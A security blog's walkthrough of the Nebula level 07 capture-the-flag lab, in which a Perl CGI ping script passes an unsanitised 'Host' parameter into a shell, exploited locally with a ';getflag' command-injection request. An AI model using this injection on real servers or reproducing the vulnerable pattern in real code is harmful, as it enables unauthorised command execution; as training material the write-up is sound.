<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#424242"
    },
    "button": {
      "background": "#2a7ae2"
    }
  },
  "content": {
    "href": "/privacy-policy"
  }
})});
</script>
  
  
  
  <title>Exploit Exercises: Nebula Level 07</title>
  <meta name="description" content="">
  
    
    <meta name="keywords" content="Lucian Nitescu nebula writeups level flag getflag exploit exercise tutorial solution">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-07/">
  
  
  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
  <meta name="flattr:id" content="njnwdo">
  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:title" content="Exploit Exercises: Nebula Level 07">
  <meta name="twitter:description" content="">
  
  

  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">

  
  <!-- Google Analytics -->
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-107695141-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Lucian Nitescu</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/">Home</a>
      
        
        <a class="page-link" href="/about/">Whoami</a>
      
        
        <a class="page-link" href="/archives/">Archives</a>
      
    </nav>
    <br>Security Blog
  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
      <h1 class="post-title" itemprop="name headline">Exploit Exercises: Nebula Level 07</h1>
    
    <p class="post-meta"><time datetime="2018-07-16T15:48:00-03:00" itemprop="datePublished">Jul 16, 2018</time> •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/nebula/">nebula</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/writeups/">writeups</a>
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  



</p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><img src="/uploads/Screenshot%20from%202018-07-16%2000-20-16.png" alt="Image of Nebula Terminal" /></p>

<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>

<h3 id="source-code">Source code</h3>

<p>(index.cgi)</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Ping results<span class="nt">&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;</span>");

  @output = `ping -c 3 $host 2&gt;<span class="ni">&amp;1`;</span>
  foreach $line (@output) { print "$line"; }

  print("<span class="nt">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span>");

}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
</code></pre></div></div>

<h3 id="solution">Solution</h3>

<p>Well, you will be surprised that this challenge took me days to complete because my webserver on my machine is getting down at every 20 minutes after system boot. I have not researched more about why the challenge is crashing all the time, but here is the simple solution of this nice challenge:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level07@nebula:~$</span> <span class="nb">ls</span>
<span class="go">index.cgi
</span><span class="gp">level07@nebula:~$</span> <span class="nb">cat </span>index.cgi
<span class="gp">&lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
<span class="gp">level07@nebula:~$</span>
<span class="go">Hmm, let’s go the flag account folder.
</span><span class="gp">level07@nebula:/home/flag07$</span> <span class="nb">ls</span> <span class="nt">-al</span>
<span class="go">total 10
drwxr-x--- 2 flag07 level07  102 Nov 20  2011 .
drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
-rw-r--r-- 1 flag07 flag07   220 May 18  2011 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 May 18  2011 .bashrc
-rw-r--r-- 1 flag07 flag07   675 May 18  2011 .profile
-rwxr-xr-x 1 root   root     368 Nov 20  2011 index.cgi
-rw-r--r-- 1 root   root    3719 Nov 20  2011 thttpd.conf
</span><span class="gp">level07@nebula:/home/flag07$</span>
</code></pre></div></div>

<p>Here we are able to see two files, index.cgi and thttpd.conf. Let’s read their content.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level07@nebula:/home/flag07$</span> <span class="nb">cat </span>index.cgi
<span class="gp">#</span><span class="o">!</span>/usr/bin/perl
<span class="go">
</span><span class="gp">use CGI qw{param};</span>
<span class="go">
</span><span class="gp">print "Content-type: text/html\n\n";</span>
<span class="go">
sub ping {
</span><span class="gp">	$</span>host <span class="o">=</span> <span class="nv">$_</span><span class="o">[</span>0]<span class="p">;</span>
<span class="go">
</span><span class="gp">	print("&lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;<span class="s2">");
</span><span class="go">
</span><span class="gp">	@output = `ping -c 3 $</span>host 2&gt;&amp;1<span class="sb">`</span><span class="p">;</span>
<span class="gp">	foreach $</span>line <span class="o">(</span>@output<span class="o">)</span> <span class="o">{</span> print <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="o">}</span>
<span class="go">
</span><span class="gp">	print("&lt;/pre&gt;</span>&lt;/body&gt;&lt;/html&gt;<span class="s2">");
</span><span class="go">
}

</span><span class="gp">#</span> check <span class="k">if </span>Host set. <span class="k">if </span>not, display normal page, etc
<span class="go">
</span><span class="gp">ping(param("Host"));</span>
<span class="go">And.
</span><span class="gp">level07@nebula:/home/flag07$</span> <span class="nb">cat </span>thttpd.conf
<span class="gp">#</span> /etc/thttpd/thttpd.conf: thttpd configuration file
<span class="go">
</span><span class="gp">#</span> This file is <span class="k">for </span>thttpd processes created by /etc/init.d/thttpd.
<span class="gp">#</span> Commentary is based closely on the thttpd<span class="o">(</span>8<span class="o">)</span> 2.25b manpage, by Jef Poskanzer.
<span class="go">
</span><span class="gp">#</span> Specifies an alternate port number to listen on.
<span class="go">port=7007

</span><span class="gp">#</span> Specifies a directory to chdir<span class="o">()</span> to at startup. This is merely a convenience -
<span class="gp">#</span> you could just as easily <span class="k">do </span>a <span class="nb">cd </span><span class="k">in </span>the shell script that invokes the program.
<span class="go">dir=/home/flag07

</span><span class="gp">#</span> Do a <span class="nb">chroot</span><span class="o">()</span> at initialization <span class="nb">time</span>, restricting file access to the program<span class="s1">'s
</span><span class="gp">#</span> <span class="s1">current directory. If chroot is the compiled-in default (not the case on
</span><span class="gp">#</span> <span class="s1">Debian), then nochroot disables it. See thttpd(8) for details.
</span><span class="go">nochroot
</span><span class="gp">#</span><span class="nb">chroot</span>
<span class="go">
</span><span class="gp">#</span> Specifies a directory to chdir<span class="o">()</span> to after chrooting. If you<span class="s1">'re not chrooting,
</span><span class="gp">#</span> <span class="s1">you might as well do a single chdir() with the dir option. If you are
</span><span class="gp">#</span> <span class="s1">chrooting, this lets you put the web files in a subdirectory of the chroot
</span><span class="gp">#</span> <span class="s1">tree, instead of in the top level mixed in with the chroot files.
</span><span class="gp">#</span><span class="s1">data_dir=
</span><span class="go">
</span><span class="gp">#</span> Don<span class="s1">'t do explicit symbolic link checking. Normally, thttpd explicitly expands
</span><span class="gp">#</span> <span class="s1">any symbolic links in filenames, to check that the resulting path stays within
</span><span class="gp">#</span> <span class="s1">the original document tree. If you want to turn off this check and save some
</span><span class="gp">#</span> <span class="s1">CPU time, you can use the nosymlinks option, however this is not
</span><span class="gp">#</span> <span class="s1">recommended. Note, though, that if you are using the chroot option, the
</span><span class="gp">#</span> <span class="s1">symlink checking is unnecessary and is turned off, so the safe way to save
</span><span class="gp">#</span> <span class="s1">those CPU cycles is to use chroot.
</span><span class="gp">#</span><span class="s1">symlinks
</span><span class="gp">#</span><span class="s1">nosymlinks
</span><span class="go">
</span><span class="gp">#</span> Do el-cheapo virtual hosting. If vhost is the compiled-in default <span class="o">(</span>not the
<span class="gp">#</span> <span class="k">case</span> on Debian<span class="p">)</span>, <span class="k">then </span>novhost disables it. See thttpd<span class="o">(</span>8<span class="o">)</span> <span class="k">for </span>details.
<span class="gp">#</span>vhost
<span class="gp">#</span>novhost
<span class="go">
</span><span class="gp">#</span> Use a global passwd file. This means that every file <span class="k">in </span>the entire document
<span class="gp">#</span> tree is protected by the single .htpasswd file at the top of the tree.
<span class="gp">#</span> Otherwise the semantics of the .htpasswd file are the same. If this option is
<span class="gp">#</span> <span class="nb">set </span>but there is no .htpasswd file <span class="k">in </span>the top-level directory, <span class="k">then </span>thttpd
<span class="gp">#</span> proceeds as <span class="k">if </span>the option was not <span class="nb">set</span> - first looking <span class="k">for </span>a <span class="nb">local</span> .htpasswd
<span class="gp">#</span> file, and <span class="k">if </span>that doesn<span class="s1">'t exist either then serving the file without any
</span><span class="gp">#</span> <span class="s1">password. If globalpasswd is the compiled-in default (not the case on Debian),
</span><span class="gp">#</span> <span class="s1">then noglobalpasswd disables it.
</span><span class="gp">#</span><span class="s1">globalpasswd
</span><span class="gp">#</span><span class="s1">noglobalpasswd
</span><span class="go">
</span><span class="gp">#</span> Specifies what user to switch to after initialization when started as root.
<span class="go">user=flag07

</span><span class="gp">#</span> Specifies a wildcard pattern <span class="k">for </span>CGI programs, <span class="k">for </span>instance <span class="s2">"**.cgi"</span> or
<span class="gp">#</span> <span class="s2">"/cgi-bin/*"</span><span class="nb">.</span> See thttpd<span class="o">(</span>8<span class="o">)</span> <span class="k">for </span>details.
<span class="go">cgipat=**.cgi

</span><span class="gp">#</span> Specifies a file of throttle settings. See thttpd<span class="o">(</span>8<span class="o">)</span> <span class="k">for </span>details.
<span class="gp">#</span><span class="nv">throttles</span><span class="o">=</span>/etc/thttpd/throttle.conf
<span class="go">
</span><span class="gp">#</span> Specifies a <span class="nb">hostname </span>to <span class="nb">bind </span>to, <span class="k">for </span>multihoming. The default is to <span class="nb">bind </span>to
<span class="gp">#</span> all hostnames supported on the <span class="nb">local </span>machine. See thttpd<span class="o">(</span>8<span class="o">)</span> <span class="k">for </span>details.
<span class="gp">#</span><span class="nv">host</span><span class="o">=</span>
<span class="go">
</span><span class="gp">#</span> Specifies a file <span class="k">for </span>logging. If no logfile option is specified, thttpd logs
<span class="gp">#</span> via syslog<span class="o">()</span><span class="nb">.</span> If <span class="nv">logfile</span><span class="o">=</span>/dev/null is specified, thttpd doesn<span class="s1">'t log at all.
</span><span class="gp">#</span><span class="s1">logfile=/var/log/thttpd.log
</span><span class="go">
</span><span class="gp">#</span> Specifies a file to write the process-id to. If no file is specified, no
<span class="gp">#</span> process-id is written. You can use this file to send signals to thttpd. See
<span class="gp">#</span> thttpd<span class="o">(</span>8<span class="o">)</span> <span class="k">for </span>details.
<span class="gp">#</span><span class="nv">pidfile</span><span class="o">=</span>
<span class="go">
</span><span class="gp">#</span> Specifies the character <span class="nb">set </span>to use with text MIME types.
<span class="gp">#</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
<span class="go">
</span><span class="gp">#</span> Specifies a P3P server privacy header to be returned with all responses. See
<span class="gp">#</span> http://www.w3.org/P3P/ <span class="k">for </span>details. Thttpd doesn<span class="s1">'t do anything at all with the
</span><span class="gp">#</span> <span class="s1">string except put it in the P3P: response header.
</span><span class="gp">#</span><span class="s1">p3p=
</span><span class="go">
</span><span class="gp">#</span> Specifies the number of seconds to be used <span class="k">in </span>a <span class="s2">"Cache-Control: max-age"</span>
<span class="gp">#</span> header to be returned with all responses. An equivalent <span class="s2">"Expires"</span> header is
<span class="gp">#</span> also generated. The default is no Cache-Control or Expires headers, which is
<span class="gp">#</span> just fine <span class="k">for </span>most sites.
<span class="gp">#</span><span class="nv">max_age</span><span class="o">=</span>
<span class="gp">level07@nebula:/home/flag07$</span>
</code></pre></div></div>

<p>index.cgi informations:</p>

<ul>
  <li>ping(param(“Host”)); ⇒ We have to provide a GET parameter called “Host” to out request to index.cgi perl script.</li>
  <li>@output = ping -c 3 $host 2&gt;&amp;1; ⇒ The GET parameter “Host” is used without any sanitisation checks directly at this line in $host.</li>
</ul>

<p>⇒ Command Injection! But where?</p>

<p>thttpd.conf informations:</p>

<ul>
  <li>/etc/thttpd/thttpd.conf: thttpd configuration file ⇒ The config file of our web server (thttpd)!</li>
  <li>port=7007 ⇒ The port where our web server is listening!</li>
  <li>cgipat=**.cgi ⇒ Is interpreting perl scripts! This is getting so easy…​ I just need…​</li>
  <li>user=flag07 ⇒ The web service is running with our target account!</li>
</ul>

<p>⇒ We have to inject getflag for our webserver on port 7007 using index.cgi (the perl script).</p>

<p>Let’s do it!!!</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level07@nebula:/home/flag07$</span> wget http://127.0.0.1:7007/index.cgi?Host<span class="o">=</span>%3Bgetflag
<span class="go">--2017-10-06 04:25:18--  http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag
Connecting to 127.0.0.1:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
</span><span class="gp">index.cgi?Host=;</span>getflag: Permission denied
<span class="go">
</span><span class="gp">Cannot write to `index.cgi?Host=;</span>getflag<span class="s1">' (Permission denied).
</span><span class="gp">level07@nebula:/home/flag07$</span>
</code></pre></div></div>

<p>Well in the above command I am using wget (Web Get) to retrieve the response in html from my web server on localhost port 7007. But, I am trying to write in the wrong folder. The grand final:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level07@nebula:/home/flag07$</span> <span class="nb">cd</span> ~
<span class="gp">level07@nebula:~$</span> wget http://127.0.0.1:7007/index.cgi?Host<span class="o">=</span>%3Bgetflag
<span class="go">--2017-10-24 07:40:31--  http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag
Connecting to 127.0.0.1:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
</span><span class="gp">Saving to: `index.cgi?Host=;</span>getflag<span class="s1">'
</span><span class="go">
</span><span class="gp">    [ &lt;=&gt;</span>                                                                                                                                                               <span class="o">]</span> 136         <span class="nt">--</span>.-K/s   <span class="k">in </span>0.006s
<span class="go">
</span><span class="gp">2017-10-24 07:40:31 (22.7 KB/s) - `index.cgi?Host=;</span>getflag<span class="s1">' saved [136]
</span><span class="go">
</span><span class="gp">level07@nebula:~$</span> <span class="nb">ls</span> <span class="nt">-al</span>
<span class="go">total 11
drwxr-x--- 1 level07 level07   80 Oct 24 07:40 .
drwxr-xr-x 1 root    root      80 Aug 27  2012 ..
-rw-r--r-- 1 level07 level07  220 May 18  2011 .bash_logout
-rw-r--r-- 1 level07 level07 3353 May 18  2011 .bashrc
drwx------ 2 level07 level07   60 Oct 24 07:38 .cache
-rw------- 1 level07 level07   41 Aug 18  2012 .lesshst
-rw-r--r-- 1 level07 level07  675 May 18  2011 .profile
-rw------- 1 level07 level07  711 Aug 18  2012 .viminfo
-rw-rw-r-- 1 level07 level07   77 Aug 18  2012 index.cgi
</span><span class="gp">-rw-rw-r-- 1 level07 level07  136 Oct 24 07:40 index.cgi?Host=;</span>getflag
<span class="gp">level07@nebula:~$</span> <span class="nb">cat </span>index.cgi<span class="se">\?</span>Host<span class="se">\=\;</span>getflag
<span class="gp">&lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account
<span class="gp">&lt;/pre&gt;</span>&lt;/body&gt;&lt;/html&gt;
<span class="gp">level07@nebula:~$</span>
</code></pre></div></div>

  </div>

  
    <div class="post-comments" itemprop="comment">
      <hr />
<h1>Comments</h1>
<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://nitesculucian.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

    </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>

      | <a href="/privacy-policy" >Privacy Policy</a>
      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
    </p>

  </div>

</footer>


  </body>

</html>
